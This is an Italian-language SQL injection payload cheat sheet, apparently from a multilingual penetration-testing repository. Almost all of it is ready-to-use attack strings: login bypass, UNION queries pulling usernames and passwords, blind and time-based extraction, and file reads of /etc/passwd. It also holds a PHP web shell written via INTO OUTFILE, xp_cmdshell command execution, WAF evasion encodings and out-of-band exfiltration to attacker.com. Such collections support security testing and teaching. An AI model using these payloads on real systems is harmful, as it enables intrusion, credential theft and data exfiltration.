# 💉 Payload di SQL injection

<!-- language-home-navigation -->
[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](SQLi.tr.md) • [🇬🇷 Ελληνικά](SQLi.el.md)

> **Nota sugli esempi originali:** Sintassi, concatenazione, commenti e funzioni dipendono dal DBMS e dalla versione. Gli esempi che leggono/scrivono file, eseguono comandi o usano un canale esterno richiedono privilegi e configurazioni adatte; non sono funzioni sempre disponibili. Le righe con Username/Password e i commenti dimostrativi nella rilevazione sono valori letterali dell’originale.


```
  ███████╗ ██████╗ ██╗     ██╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ██╔════╝██╔═══██╗██║     ██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
  ███████╗██║   ██║██║     ██║    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
  ╚════██║██║▄▄ ██║██║     ██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ███████║╚██████╔╝███████╗██║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
```

---

## 📋 Indice

- [Payload di rilevamento](#-payload-di-rilevamento)
- [Aggiramento dell'autenticazione](#-aggiramento-dellautenticazione)
- [Injection basata su UNION](#-injection-basata-su-union)
- [Injection basata sugli errori](#-injection-basata-sugli-errori)
- [SQL injection blind](#-sql-injection-blind)
- [Injection basata sui tempi di risposta](#-injection-basata-sui-tempi-di-risposta)
- [Esempi specifici per DBMS](#-esempi-specifici-per-dbms)
- [Aggiramento del WAF](#-aggiramento-del-waf)
- [Canale esterno (out-of-band)](#-canale-esterno-out-of-band)

---

## 🔍 Payload di rilevamento

### Rilevamento di base

```sql
'
"
`
')
")
`)
'))
"))
`))

-- comment
/* comment */
# comment (MySQL)
```

### Rilevamento booleano

```sql
' OR '1'='1
' OR '1'='1' --
' OR 1=1 --
" OR "1"="1
" OR 1=1 --
' OR 'x'='x
' OR ''='
') OR ('1'='1
') OR ('x'='x
1' OR '1'='1
1" OR "1"="1
```

### Rilevamento aritmetico

```sql
' OR 1=1--
' OR 1=2--
' AND 1=1--
' AND 1=2--
1 OR 1=1
1 AND 1=1
1 AND 1=2
```

### Concatenazione di stringhe

```sql
' || 'test
' + 'test
' 'test
```

---

## 🔓 Aggiramento dell'autenticazione

### Aggiramento dell'accesso

```sql
admin' --
admin' #
admin'/*
' OR 1=1--
' OR 1=1#
' OR 1=1/*
') OR '1'='1--
') OR ('1'='1--
' OR ''='
' OR 1=1-- -
```

### Campo del nome utente

```sql
admin'--
admin' OR '1'='1
admin' OR '1'='1'--
admin' OR '1'='1'/*
admin' OR 1=1--
admin'/*
```

### Campo della password

```sql
' OR '1'='1
' OR ''='
' OR 1=1--
anything' OR '1'='1
```

### Combinazioni comuni di aggiramento

```sql
Username: admin'--
Password: anything

Username: ' OR 1=1--
Password: anything

Username: admin
Password: ' OR '1'='1

Username: ' OR '1'='1' --
Password: ' OR '1'='1' --
```

---

## 🔗 Injection basata su UNION

### Individuare le colonne

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
...continua fino a ottenere un errore...

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### UNION di base

```sql
' UNION SELECT 1--
' UNION SELECT 1,2--
' UNION SELECT 1,2,3--
' UNION SELECT 1,2,3,4--
```

### Estrazione dei dati

```sql
-- MySQL
' UNION SELECT user(),database()--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--

-- PostgreSQL
' UNION SELECT current_user,version()--
' UNION SELECT table_name,NULL FROM information_schema.tables--

-- MSSQL
' UNION SELECT @@version,NULL--
' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--

-- Oracle
' UNION SELECT NULL,NULL FROM dual--
' UNION SELECT table_name,NULL FROM all_tables--
```

### UNION con commenti

```sql
' UNION SELECT 1,2,3-- -
' UNION SELECT 1,2,3#
' UNION SELECT 1,2,3/*
' UNION SELECT 1,2,3;%00
```

---

## ⚠ Injection basata sugli errori

### Injection basata sugli errori in MySQL

```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--

' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--

' AND EXP(~(SELECT * FROM (SELECT version())x))--
```

### Injection basata sugli errori in MSSQL

```sql
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--

' AND 1=(SELECT TOP 1 CAST(username AS int) FROM users)--
```

### Injection basata sugli errori in PostgreSQL

```sql
' AND 1=CAST((SELECT version()) AS int)--

' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--
```

### Injection basata sugli errori in Oracle

```sql
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1))--

' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--
```

---

## 🔮 SQL injection blind

### Blind basata su condizioni booleane

```sql
-- Condizione vera
' AND 1=1--
' AND 'a'='a'--

-- Condizione falsa
' AND 1=2--
' AND 'a'='b'--

-- Estrazione dei caratteri
' AND SUBSTRING(username,1,1)='a'--
' AND SUBSTRING((SELECT database()),1,1)='t'--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>100--
```

### Ricerca binaria

```sql
' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>96--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>112--
...restringi l’intervallo fino al carattere esatto...
```

### Rilevamento della lunghezza

```sql
' AND LENGTH(database())>1--
' AND LENGTH(database())>5--
' AND LENGTH(database())=7--
```

### Enumerazione di tabelle e colonne

```sql
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5--

' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='u'--
```

---

## ⏱ Injection basata sui tempi di risposta

### MySQL

```sql
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
' AND BENCHMARK(10000000,SHA1('test'))--

1' AND (SELECT SLEEP(5) FROM dual WHERE database() LIKE 't%')--
```

### PostgreSQL

```sql
'; SELECT pg_sleep(5)--
' AND 1=(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 1 END)--
' || pg_sleep(5)--
```

### MSSQL

```sql
'; WAITFOR DELAY '0:0:5'--
' AND 1=1 WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

### Oracle

```sql
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
' AND 1=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END)--
```

---

## 🗄 Esempi specifici per DBMS

### Payload MySQL

```sql
-- Versione
' UNION SELECT @@version--
' UNION SELECT version()--

-- Utente corrente
' UNION SELECT user()--
' UNION SELECT current_user()--

-- Database
' UNION SELECT database()--

-- Tabelle
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--

-- Colonne
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--

-- Leggi un file
' UNION SELECT LOAD_FILE('/etc/passwd')--

-- Scrivi un file
' UNION SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php'--
```

### Payload PostgreSQL

```sql
-- Versione
' UNION SELECT version()--

-- Utente corrente
' UNION SELECT current_user--

-- Database
' UNION SELECT current_database()--

-- Tabelle
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'--

-- Leggi un file
' UNION SELECT pg_read_file('/etc/passwd')--

-- Esecuzione di comandi
'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id';--
```

### Payload MSSQL

```sql
-- Versione
' UNION SELECT @@version--

-- Utente corrente
' UNION SELECT SYSTEM_USER--

-- Database
' UNION SELECT DB_NAME()--

-- Tabelle
' UNION SELECT name FROM sysobjects WHERE xtype='U'--

-- Esecuzione di comandi
'; EXEC xp_cmdshell 'whoami';--

-- Abilita xp_cmdshell
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
```

### Payload Oracle

```sql
-- Versione
' UNION SELECT banner FROM v$version WHERE rownum=1--

-- Utente corrente
' UNION SELECT user FROM dual--

-- Database
' UNION SELECT ora_database_name FROM dual--

-- Tabelle
' UNION SELECT table_name FROM all_tables--

-- Colonne
' UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS'--
```

---

## 🛡 Aggiramento del WAF

### Aggiramento del filtro sugli spazi

```sql
'/**/OR/**/1=1--
' OR/**/1=1--
'%09OR%091=1--
'%0AOR%0A1=1--
'%0COR%0C1=1--
'%0DOR%0D1=1--
'+OR+1=1--
```

### Aggiramento tramite commenti

```sql
/*!50000SELECT*/ * FROM users
SELECT/**_**/ * FROM users
SELECT%0a* FROM users
```

### Variazione di maiuscole e minuscole

```sql
' uNiOn SeLeCt 1,2,3--
' UnIoN sElEcT 1,2,3--
```

### Codifica

```sql
-- Codifica URL
%27%20OR%201=1--
%27%20UNION%20SELECT%201,2,3--

-- Doppia codifica URL
%2527%20OR%201=1--

-- Codifica esadecimale
' UNION SELECT 0x61646d696e--  (admin in hex)
```

### Aggiramento dei filtri sulle parole chiave

```sql
-- Aggiramento del filtro su UNION
' UNION ALL SELECT
' /*!UNION*/ SELECT
' UN/**/ION SE/**/LECT

-- Aggiramento del filtro su SELECT
' UNION SEL/**/ECT
' UNION%0ASELECT
' UNION(SELECT)

-- Aggiramento del filtro su AND/OR
' && 1=1--
' || 1=1--
' %26%26 1=1--
' -1 || 1=1--
```

### HPP (HTTP Parameter Pollution, duplicazione dei parametri HTTP)

```
?id=1&id=' OR '1'='1
?id=1/*&id=*/' OR '1'='1
```

---

## 📡 Canale esterno (out-of-band)

### OOB in MySQL

```sql
SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\a'))
SELECT * INTO OUTFILE '\\\\attacker.com\\share\\output.txt'
```

### OOB in MSSQL

```sql
'; EXEC master..xp_dirtree '\\attacker.com\share'--
'; EXEC master..xp_fileexist '\\attacker.com\share'--
```

### OOB in PostgreSQL

```sql
CREATE EXTENSION dblink; SELECT dblink_connect('host=attacker.com user=test password=test dbname=test')
```

### OOB in Oracle

```sql
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||version) FROM dual
SELECT HTTPURITYPE('http://attacker.com/'||version).GETCLOB() FROM dual
```

---

## 📊 Riferimento rapido

### Ordine di rilevamento

1. `'` - Apice singolo
2. `"` - Virgolette doppie
3. `' OR '1'='1` - Injection booleana
4. `' AND SLEEP(5)--` - Basata sui tempi
5. `' UNION SELECT NULL--` - Basata su UNION

### Endpoint comuni

```
- Moduli di accesso
- Caselle di ricerca
- ID degli utenti negli URL
- Valori dei cookie
- Header HTTP (User-Agent, Referer)
- Parametri API
```

### Commenti SQL per DBMS

| DBMS | Commenti |
|------|----------|
| MySQL | `-- `, `#`, `/* */` |
| PostgreSQL | `-- `, `/* */` |
| MSSQL | `-- `, `/* */` |
| Oracle | `-- `, `/* */` |

---

## 📚 Risorse

- [SQL injection di PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PayloadsAllTheThings SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

---

<p align="center">
  <b>💉 Raccolta di payload SQL injection</b><br>
  <i>Solo per scopi didattici!</i>
</p>
